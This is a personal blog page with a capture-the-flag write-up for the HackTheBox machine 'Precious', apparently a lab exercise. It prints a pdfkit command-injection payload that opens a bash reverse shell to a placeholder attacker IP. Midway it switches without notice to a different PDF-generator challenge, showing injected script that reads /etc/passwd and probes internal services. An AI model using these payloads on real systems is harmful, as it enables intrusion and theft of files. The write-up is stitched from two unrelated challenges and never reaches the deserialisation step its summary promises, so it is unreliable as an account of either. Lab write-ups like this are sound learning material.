<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
    <title>Layton's Blog</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="stylesheet" href="/Website/css/bootstrap.min.css">
    <link rel="stylesheet" href="/Website/css/style.css">
  </head>
  <body class="main-layout">
    <header>
      <div class="head_top">
        <div class="header">
          <div class="container-fluid">
            <div class="row">
              <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
                <div class="full">
                  <div class="center-desk">
                    <div class="logo">
                      <a href="/Website/index.html">
                        <img src="/Website/images/logo.png" alt="#">
                      </a>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
                <nav class="navigation navbar navbar-expand-md navbar-dark">
                  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                  </button>
                  <div class="collapse navbar-collapse" id="navbarsExample04">
                    <ul class="navbar-nav mr-auto">
                      <li class="nav-item">
                        <a class="nav-link" href="/Website/index.html">Home</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="/Website/about.html">About</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">Contact</a>
                      </li>
                    </ul>
                  </div>
                </nav>
              </div>
            </div>
          </div>
        </div>
        <section class="banner_main">
          <div class="container">
            <div class="row d_flex">
              <div class="col-xl-8 col-lg-8 col-md-8 col-12-9">
                <div class="text-bg">
                  <h1>Personal Blog <br>
                    <span class="white1">be ready to master</span>
                  </h1>
                  <p></p>
                  <a onclick='document.getElementById("middle").scrollIntoView({behavior:"smooth"})'>
                    <b style="color:#3e3e3e">Read More</b>
                  </a>
                  <p></p>
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>
    </header>
    <div class="blog_main" id="middle">
      <div class="container2">
        <div class="row">
          <div class="col-md-12">
            <div class="titlepage">
              <h2> HTB - PRECIOUS </h2>
              <span>TLDR: CVE-2022-25765 [Command Injection] + Ruby Deserialisation Gadget Chain</span>
            </div>
          </div>
        </div>
        <div class="row2">
          <div class="our_text_box_test">
            <h3 class="awesome pa_wi">Writeup:</h3>
            <p>
            <h3>== Enumeration ==</h3>
            </p>
            <p> Fired up nmap, but found nothing suspecious (just port 22, 80 as ususal for HackTheBox).
            <br>Added the IP to /etc/hosts bound to precious.htb and visited the WebPage. Seems like a converter for Web Pages to a PDF File through an URL.
            <br>Tested it with a http-link to my Website but got following Error Message:</p>
            <br>
            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS2.png" alt="website" class="center">
            <br>
            <br>
            <p>
            <h3>== How to get a PDF ==</h3>
            </p>
            <p> Okay, it says "remote URL". What about the localhost?
            <br>I checked it with <md> http://localhost:80/ </md> but got the same Error.
            <br>Strange isnt it? So I tried various other options to get a pdf, but it was always the Remote-Error or it throw another Error if the input didnt start with "http(s)".
            <br>If this is the right way, how do I get something interesting? So I put a character in most functions doesnt like that much.
            <br>Et voil√†, <md> http://%00 </md> downloaded an empty PDF! But I didnt find a way to get a pdf with some content.
            <br>Then I took a look at the PDF-Creator trough the Browser Console: </p>
            <br>
            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS3.png" alt="website" class="center">
            <br>
            <br>
            <p> pdkit v0.8.6
            <br> Checked the version and found out that it isnt the most up to date!
            <br> Scrapping GitHub I saw a few posts about the changes since then and finally found a vulnerability that could be exploitable. </p>
            <br>
            <br>
            <p>
            <h3>== CVE-2022-25765 ==</h3>
            </p>
            <p>This vulernability is about Command Injection as the URL is not properly sanitized.
            <br>Found an&nbsp <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">PoC</a> on snyk's Website. And came up with following Payload:  <p-js> http://example.com/?name=#{'%20`bash -c "/bin/bash -i >&amp; /dev/tcp/[ATTACKER IP]/[PORT] 0>&amp;1"`'} </p-js>
            <br>Spun up a netcat listener and catched a reverse shell! </p>
            <br>
            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEINPUTFILTER.png" alt="website" class="center">
            <br>
            <p>Not so cool... <br>After trying several different methods to gain xss I realized that this is not gonna happen and my input will always be detected as dangerous, no workaround for the filter... </p>
            <p>But my input isnt the only thing that gets reflected in the pdf, so what about the user agent? <br>Setting my user-agent to:&nbsp &nbsp <p-js>&lt;img src="https://i1.sndcdn.com/artworks-000599808744-91k9x2-t500x500.jpg"></p-js>Worked! </p>
            <br>
            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEHACKERMAN.png" alt="website" class="center">
            <br>
            <br>
            <br>
            <p>
            <h3>== External Pictures are good. Internal files are better ==</h3>
            </p>
            <p>So far so good, but imbedding pictures wont help to crush this challenge. What about webhooks? Works, but wont get us further either... <br>What about internal files? Trying a few scripts I came up with: <br>
              <p-js>&lt;script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); &lt;/script>
            </p>
            <br>
            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEPASSWD.png" alt="website" class="center">
            <br>
            <br>
            <p>There were a few files accesible, but not all of them were interesting or usefull for this challenge <br>But lets take a look at <md>/etc/hosts</md>
            </p>
            <br>
            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEHOSTS.png" alt="website" class="center">
            <br>
            <br>
            <br>
            <p>
            <h3>== Run for the flag ==</h3>
            </p>
            <p>Two private network addresses, one for the flask application and one for an nodeApi? <br>Can we access these somehow within the pdf creation? So, flask usually runs on port 5000, lets check! <br>
              <p-js>&lt;script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","http://pdf-carnage-flask:5000/"); x.send(); &lt;/script>
            </p>
            <br>
            <p>This will create an pdf, however its empty. So the port seems to be the right one, but no more information besides that. Tinkering with that for a while I found nothing... <br>So I took a closer look at the api, accessable on <md>http://nodeapi:3000</md> within the payload. </p>
            <br>
            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEAPI.png" alt="website" class="center">
            <br>
            <p>Yeah, no shit Sherlock, I already knew you were the API. <br>Okay lets check some endpoints here. Maybe <md>/flag?</md>&nbsp &nbsp ... Unfortunately not. <br>So there are two options now to solve the challenge: <br>The real Problem at the end was that requesting a PDF had a limitation of 15 requests per minute. Maybe this writeup reads like "I know about dynamic pdf XSS, let me grab the flag real quick", but it was not. Finding out LFI works was a matter of under 30min. Finding the flag? Whole different story. <br>Time ran out, and either you were lucky enough to check for <md>http://nodeapi:3000/sitemap.xml</md> or u were super lucky enough to check directly for <md>http://nodeapi:3000/api/flag</md>
            </p>
            <br>
            <br>
            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEFLAG.png" alt="website" class="center">
            <br>
            <br>
            <h3 class="awesome pa_wi">Thoughts:</h3>
            <p>The challenge was overall pretty cool. Fuzzing limitaiton was pain in the ass</p>
            <br>
            <div class="post_box padding_bottom1">
              <h4 class="flot_left1">Post By : Layton</h4>
              <br>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="section">
      <div id="" class="Testimonial">
        <div class="container">
          <div class="row">
            <div class="col-md-6 offset-md-3">
              <div class="titlepage">
                <h2>About Myself</h2>
              </div>
            </div>
          </div>
          <div class="row d_flex">
            <div class="col-md-3">
              <div class="Testimonial_box">
                <i>
                  <img src="/Website/images/plan1.png" alt="#">
                </i>
              </div>
            </div>
            <div class="col-md-9">
              <div class="Testimonial_box">
                <h4>Layton</h4>
                <p>Comming Soon I guess <br>Just a S0l0N00b crushing some easy WebChallenges </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <footer>
      <div class="footer">
        <div class="container">
          <div class="row">
            <div class="col-md-12">
              <div class="cont">
                <h3>
                  <strong class="multi">Layton</strong>
                  <br>Blog 2022
                </h3>
              </div>
            </div>
            <div class="col-md-12">
              <ul class="social_icon">
                <li>
                  <a href="https://github.com/SeraphLayton">
                    <img src="/Website/images/github_32_black.ico">
                    <i class="fa fa-github" aria-hidden="true"></i>
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
        <div class="copyright">
          <div class="container">
            <div class="row">
              <div class="col-md-12">
                <p>Since 2022</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </body>
</html>
